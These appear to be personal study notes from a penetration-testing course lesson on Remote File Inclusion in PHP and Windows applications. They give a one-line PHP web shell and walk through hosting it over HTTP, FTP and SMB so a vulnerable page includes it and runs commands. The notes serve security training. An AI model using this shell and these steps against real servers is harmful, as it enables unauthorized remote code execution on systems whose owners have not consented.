- In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various `SSRF` techniques, which may also be used with RFI vulnerabilities.

# Local vs. Remote File Inclusion
---
- When a vulnerable function **allows us to include remote files**, we may be able to **host a malicious script, and then include it in the vulnerable page** to execute **malicious functions and gain remote code execution.**

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `include`                    |        ✅         |      ✅      |       ✅        |

- As we can see, **==almost any RFI vulnerability is also an LFI vulnerability,==** as any function that allows including remote URLs usually also allows including local ones.
- However, **==an LFI may not necessarily be an RFI.==**

	1. The vulnerable function **may not allow including remote URLs**
	2. You may **only control a portion of the filename and not the entire protocol** wrapper (ex: `http://`, `ftp://`, `https://`).
	3. The **configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.**

# Verify RFI
---
- Any **==remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.==** We can check whether this setting is enabled through LFI, as we did in the previous:
	- `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`

- However, this may **not always be reliable**, as even **if this setting is enabled,** the **vulnerable function may not allow remote URL inclusion to begin with.**
- So, a more reliable way to determine whether an LFI vulnerability is also **==vulnerable to RFI is to `try and include a URL`, and see if we can get its content==**
- At first, **`we should always start by trying to include a local URL`** to ensure our attempt does not get blocked by a firewall.
- So, let's **use (`http://127.0.0.1:80/index.php`) as our input string** and see if it gets included:
	- ![[Pasted image 20251102141822.png]]
- As we can see, **the `index.php` page got included in the vulnerable section (i.e. History Description),** so the page is indeed vulnerable to RFI.
- Furthermore, the `index.php` page did not get included as source code text but **got executed and rendered as PHP, ==so the vulnerable function also allows PHP execution**.==
- We also see that **we were able to specify port `80` and get the web application on that port.**
- If the back-end server hosted any other local web applications (e.g. port `8080`), then **we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.**
**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

# Remote Code Execution with RFI
---
- The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case:
	- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- Now, all we need to do is host this script and **include it through the RFI vulnerability.**
- It is a good idea to listen on a **common HTTP port like `80` or `443`, as these ports may be whitelisted.**
- Furthermore, **we may host the script through an FTP service or an SMB service,** as we will see next.

## HTTP
- `sudo python3 -m http.server <LISTENING_PORT>`
Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. **We will also specify the command to be executed with `&cmd=id`:**
	![[Pasted image 20251102142539.png]]

- **Tip:** We can **examine the connection on our machine to ensure the request is being sent as we specified it.** 
- For example, if we saw an **extra extension (.php) was appended to the request, then we can omit it from our payload**.

## FTP
- `sudo python -m pyftpdlib -p 21`
- This may also be **==useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF==**. 
- To include our script, we can repeat what we did earlier, **but use the `ftp://` scheme in the URL**, as follows:
	- ![[Pasted image 20251102142647.png]]

## ==SMB==
- If the **vulnerable web application ==is hosted on a Windows server== (which we can tell from the server version in the HTTP response headers)**, **the==n we do not need the `allow_url_include` setting to be enabled for RFI== exploitation, as ==we can utilize the SMB protocol for the remote file inclusion==.** 
- This is **==because Windows treats files on remote SMB servers as normal files==**, which can be referenced directly with a UNC path.
- We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
	- `impacket-smbserver -smb2support share $(pwd)`

- Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:
	- ![[Pasted image 20251102142924.png]]
- However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.b 